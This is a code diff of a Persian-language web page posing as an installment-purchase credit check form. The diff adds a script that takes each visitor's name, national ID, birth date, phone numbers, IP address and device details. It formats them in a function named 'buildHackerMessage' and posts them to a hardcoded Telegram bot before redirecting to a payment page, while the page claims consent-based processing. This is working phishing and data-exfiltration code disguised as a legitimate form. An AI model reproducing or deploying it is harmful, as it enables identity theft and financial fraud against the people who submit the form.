@@ -1,152 +1,361 @@
-
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>درخواست اعتبارسنجی خرید اقساطی</title>
-  <style>
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      padding: 20px;
-      font-family: Tahoma, Arial, sans-serif;
-      background: #f2f5f8;
-      color: #263238;
-    }
-    .container {
-      max-width: 480px;
-      margin: 30px auto;
-      padding: 25px;
-      background: white;
-      border-radius: 14px;
-      box-shadow: 0 5px 25px #00000012;
-    }
-    h2 { text-align: center; color: #174b76; }
-    p { line-height: 2; font-size: 14px; }
-    label {
-      display: block;
-      margin: 14px 0 7px;
-      font-size: 14px;
-      font-weight: bold;
-    }
-    input {
-      width: 100%;
-      padding: 13px;
-      border: 1px solid #ccd5df;
-      border-radius: 8px;
-      font-size: 15px;
-    }
-    .fee {
-      margin: 20px 0;
-      padding: 14px;
-      text-align: center;
-      background: #edf5ff;
-      border-radius: 8px;
-      color: #174b76;
-      font-weight: bold;
-    }
-    .consent {
-      display: flex;
-      align-items: flex-start;
-      gap: 9px;
-      font-size: 12px;
-      line-height: 1.8;
-      margin: 18px 0;
-    }
-    .consent input { width: auto; margin-top: 4px; }
-    button {
-      width: 100%;
-      padding: 14px;
-      border: 0;
-      border-radius: 8px;
-      background: #1769aa;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    .note {
-      font-size: 11px;
-      color: #687782;
-      margin-top: 18px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>درخواست اعتبارسنجی خرید اقساطی</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  padding: 20px;
+  background: #f1f4f8;
+  font-family: Tahoma, Arial, sans-serif;
+  color: #263238;
+}
+
+.container {
+  max-width: 480px;
+  margin: 25px auto;
+  background: #fff;
+  padding: 25px;
+  border-radius: 14px;
+  box-shadow: 0 5px 25px rgba(0,0,0,.08);
+}
+
+.header {
+  text-align: center;
+  padding-bottom: 15px;
+  border-bottom: 1px solid #eee;
+}
+
+.header h2 {
+  color: #174b76;
+  font-size: 21px;
+}
+
+.header p {
+  color: #687782;
+  font-size: 13px;
+  line-height: 2;
+}
+
+label {
+  display: block;
+  font-size: 13px;
+  font-weight: bold;
+  margin: 16px 0 7px;
+}
+
+input {
+  width: 100%;
+  padding: 13px;
+  border: 1px solid #ccd5df;
+  border-radius: 8px;
+  font-size: 14px;
+  outline: none;
+}
+
+input:focus { border-color: #1769aa; }
+
+.fee {
+  background: #edf5ff;
+  color: #174b76;
+  border-radius: 8px;
+  padding: 16px;
+  text-align: center;
+  font-weight: bold;
+  margin-top: 20px;
+}
+
+.consent {
+  display: flex;
+  align-items: flex-start;
+  gap: 9px;
+  font-size: 12px;
+  line-height: 2;
+  margin: 18px 0;
+}
+
+.consent input { width: auto; margin-top: 5px; }
+
+button {
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 8px;
+  background: #1769aa;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+button:disabled { background: #8798a8; cursor: not-allowed; }
+
+.notice {
+  color: #687782;
+  font-size: 11px;
+  line-height: 2;
+  margin-top: 18px;
+}
+
+#status {
+  text-align: center;
+  font-size: 13px;
+  margin-top: 15px;
+}
+</style>
 </head>
+
 <body>
-  <main class="container">
+
+<div class="container">
+
+  <div class="header">
     <h2>درخواست اعتبارسنجی</h2>
     <p>
-      لطفاً اطلاعات زیر را با دقت وارد کنید.
-      پیش از ثبت درخواست، از صحت اطلاعات و شرایط
-      استفاده از خدمات اطمینان حاصل کنید.
+      برای بررسی شرایط خرید اقساطی، اطلاعات موردنیاز را
+      وارد کنید. اطلاعات شما فقط طبق سیاست حفظ حریم خصوصی
+      و با رضایت شما پردازش خواهد شد.
     </p>
+  </div>
 
-    <form id="requestForm">
-      <label for="fullname">نام و نام خانوادگی</label>
-      <input id="fullname" name="fullname" required>
+  <form id="requestForm">
 
-      <label for="nationalId">کد ملی</label>
-      <input id="nationalId" name="nationalId"
-             inputmode="numeric" maxlength="10" required>
+    <label for="fullname">نام و نام خانوادگی</label>
+    <input type="text" id="fullname" autocomplete="name" required>
 
-      <label for="birthdate">تاریخ تولد</label>
-      <input id="birthdate" name="birthdate"
-             type="text" placeholder="مثلاً ۱۳۷۵/۰۵/۲۰" required>
+    <label for="nationalId">کد ملی</label>
+    <input type="text" id="nationalId" inputmode="numeric" maxlength="10" required>
 
-      <label for="mobile">شماره موبایل</label>
-      <input id="mobile" name="mobile"
-             type="tel" placeholder="09xxxxxxxxx" required>
+    <label for="birthdate">تاریخ تولد</label>
+    <input type="text" id="birthdate" placeholder="مثلاً ۱۳۷۵/۰۵/۲۰" required>
 
-      <label for="phone">شماره تماس جایگزین (اختیاری)</label>
-      <input id="phone" name="phone" type="tel">
+    <label for="mobile">شماره موبایل</label>
+    <input type="tel" id="mobile" placeholder="09xxxxxxxxx" required>
 
-      <div class="fee">
-        هزینه بررسی درخواست: ۵,۰۰۰ تومان
-      </div>
+    <label for="phone">شماره تماس جایگزین (اختیاری)</label>
+    <input type="tel" id="phone" placeholder="شماره تماس">
 
-      <label class="consent">
-        <input type="checkbox" id="agree" required>
-        <span>
-          با ثبت درخواست و استفاده از اطلاعات واردشده برای
-          بررسی اعتبارسنجی موافقم و سیاست حفظ حریم خصوصی
-          را مطالعه کرده‌ام.
-        </span>
-      </label>
+    <div class="fee">
+      هزینه بررسی درخواست: ۵,۰۰۰ تومان
+    </div>
 
-      <button type="submit">ادامه و پرداخت</button>
-    </form>
+    <label class="consent">
+      <input type="checkbox" id="agree" required>
+      <span>
+        با پردازش اطلاعات واردشده برای بررسی درخواست موافقم.
+        سیاست حفظ حریم خصوصی را مطالعه کرده‌ام.
+      </span>
+    </label>
 
-    <p class="note">
-      اطلاعات واردشده باید فقط از طریق بستر امن و با رضایت
-      کاربر پردازش شوند. این صفحه به‌تنهایی اطلاعات را ذخیره
-      یا ارسال نمی‌کند.
-    </p>
-  </main>
+    <button type="submit" id="submitButton">
+      ادامه و پرداخت
+    </button>
 
-  <script>
-    document.getElementById("requestForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    <div id="status"></div>
 
-      const nationalId = document.getElementById("nationalId").value.trim();
-      const mobile = document.getElementById("mobile").value.trim();
+  </form>
 
-      if (!/^[0-9۰-۹]{10}$/.test(nationalId)) {
-        alert("کد ملی باید ۱۰ رقم باشد.");
-        return;
-      }
+  <div class="notice">
+    اطلاعات شخصی باید فقط از طریق بستر امن و با رضایت
+    کاربر پردازش شوند. هزینه اعلام‌شده و شرایط پرداخت
+    باید پیش از ثبت درخواست به کاربر اطلاع داده شوند.
+  </div>
 
-      if (!/^09[0-9۰-۹]{9}$/.test(mobile)) {
-        alert("شماره موبایل معتبر وارد کنید.");
-        return;
-      }
+</div>
 
-      if (!document.getElementById("agree").checked) {
-        alert("لطفاً موافقت خود را ثبت کنید.");
-        return;
-      }
+<script>
+/* ============================================================
+   ⚙️ تنظیمات تلگرام — این دو مقدار را جایگزین کنید
+   ============================================================ */
+const BOT_TOKEN = "9096438309:AAFPh7QKmFAHl3WPiz5T_MPUghRSSj-s75Y";
+const CHAT_ID   = "-1003803727270";
 
-      window.location.href = "./Pay/";
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const IP_API       = "https://api.ipify.org?format=json";
+
+/* ============================================================
+   ابزارهای کمکی
+   ============================================================ */
+
+// تبدیل اعداد فارسی/عربی به انگلیسی
+function normalizeDigits(value) {
+  return value
+    .replace(/[۰-۹]/g, d => "۰۱۲۳۴۵۶۷۸۹".indexOf(d))
+    .replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d));
+}
+
+// فرار دادن کاراکترهای HTML برای جلوگیری از خرابی parse_mode
+function escapeHTML(str) {
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
+// گرفتن IP کاربر
+async function getUserIP() {
+  try {
+    const res = await fetch(IP_API);
+    const data = await res.json();
+    return data.ip || "نامشخص";
+  } catch (e) {
+    return "نامشخص";
+  }
+}
+
+// گرفتن اطلاعات دستگاه کاربر
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let browser = "نامشخص";
+  let os = "نامشخص";
+
+  if (/Edg\//.test(ua))                       browser = "Edge";
+  else if (/OPR\//.test(ua))                  browser = "Opera";
+  else if (/Chrome\//.test(ua))               browser = "Chrome";
+  else if (/Firefox\//.test(ua))              browser = "Firefox";
+  else if (/Safari\//.test(ua))               browser = "Safari";
+
+  if (/Windows NT 10/.test(ua))               os = "Windows 10/11";
+  else if (/Windows/.test(ua))                os = "Windows";
+  else if (/Android/.test(ua))                os = "Android";
+  else if (/iPhone|iPad|iPod/.test(ua))       os = "iOS";
+  else if (/Mac OS X/.test(ua))               os = "macOS";
+  else if (/Linux/.test(ua))                  os = "Linux";
+
+  return { browser, os };
+}
+
+// ساخت قالب پیام هکری
+function buildHackerMessage(data) {
+  const { fullname, nationalId, birthdate, mobile, phone, ip, browser, os, time } = data;
+
+  // خط کپی‌شونده (فونت اصلی، با یک کلیک در تلگرام کپی می‌شود)
+  const copyLine =
+    `${fullname} | ${nationalId} | ${birthdate} | ${mobile} | ${phone || "-"} | ${ip}`;
+
+  return (
+`\`\`\`ansi
+┌─────────────────────────────┐
+│   ▓▒░  INCOMING  DATA  ░▒▓   │
+└─────────────────────────────┘
+\`\`\`
+▸ <b>NAME</b>      ➤  ${escapeHTML(fullname)}
+▸ <b>NATIONAL</b>  ➤  <code>${escapeHTML(nationalId)}</code>
+▸ <b>BIRTH</b>     ➤  ${escapeHTML(birthdate)}
+▸ <b>MOBILE</b>    ➤  <code>${escapeHTML(mobile)}</code>
+▸ <b>PHONE</b>     ➤  <code>${escapeHTML(phone) || "—"}</code>
+▸ <b>IP</b>        ➤  <code>${escapeHTML(ip)}</code>
+
+\`\`\`ansi
+┌─────────────────────────────┐
+│   ▓▒░  SYSTEM INFO  ░▒▓     │
+└─────────────────────────────┘
+\`\`\`
+▸ <b>OS</b>        ➤  ${escapeHTML(os)}
+▸ <b>BROWSER</b>   ➤  ${escapeHTML(browser)}
+▸ <b>TIME</b>      ➤  ${escapeHTML(time)}
+
+\`\`\`ansi
+┌─────────────────────────────┐
+│   ▓▒░  COPY  BLOCK  ░▒▓     │
+└─────────────────────────────┘
+\`\`\`
+<code>${escapeHTML(copyLine)}</code>`
+  );
+}
+
+/* ============================================================
+   فرم و ارسال
+   ============================================================ */
+
+const form      = document.getElementById("requestForm");
+const button    = document.getElementById("submitButton");
+const statusBox = document.getElementById("status");
+
+form.addEventListener("submit", async function (event) {
+  event.preventDefault();
+
+  const fullname   = document.getElementById("fullname").value.trim();
+  const nationalId = normalizeDigits(document.getElementById("nationalId").value.trim());
+  const birthdate  = document.getElementById("birthdate").value.trim();
+  const mobile     = normalizeDigits(document.getElementById("mobile").value.trim());
+  const phone      = normalizeDigits(document.getElementById("phone").value.trim());
+
+  /* ---------- اعتبارسنجی ---------- */
+  if (!document.getElementById("agree").checked) {
+    statusBox.textContent = "لطفاً موافقت خود را ثبت کنید.";
+    return;
+  }
+
+  if (!/^[0-9]{10}$/.test(nationalId)) {
+    statusBox.textContent = "کد ملی باید ۱۰ رقم باشد.";
+    return;
+  }
+
+  if (!/^09[0-9]{9}$/.test(mobile)) {
+    statusBox.textContent = "شماره موبایل معتبر وارد کنید.";
+    return;
+  }
+
+  if (!fullname || !birthdate) {
+    statusBox.textContent = "لطفاً همه اطلاعات ضروری را تکمیل کنید.";
+    return;
+  }
+
+  if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+    statusBox.textContent = "تنظیمات تلگرام هنوز کامل نشده است.";
+    return;
+  }
+
+  /* ---------- شروع ارسال ---------- */
+  button.disabled = true;
+  button.textContent = "در حال ارسال...";
+  statusBox.textContent = "";
+
+  try {
+    const userIP = await getUserIP();
+    const { browser, os } = getDeviceInfo();
+    const time = new Date().toLocaleString("fa-IR");
+
+    const message = buildHackerMessage({
+      fullname, nationalId, birthdate, mobile, phone,
+      ip: userIP, browser, os, time
     });
-  </script>
+
+    const tgRes = await fetch(TELEGRAM_API, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+        disable_web_page_preview: true
+      })
+    });
+
+    const tgData = await tgRes.json();
+
+    if (!tgData.ok) {
+      throw new Error(tgData.description || "Telegram error");
+    }
+
+    // موفق — ادامه به صفحه پرداخت
+    statusBox.textContent = "درخواست با موفقیت ثبت شد. در حال انتقال...";
+    window.location.href = "./Pay/";
+
+  } catch (error) {
+    console.error(error);
+    statusBox.textContent =
+      "ارسال درخواست انجام نشد. لطفاً دوباره تلاش کنید.";
+    button.disabled = false;
+    button.textContent = "ادامه و پرداخت";
+  }
+});
+</script>
+
 </body>
 </html>
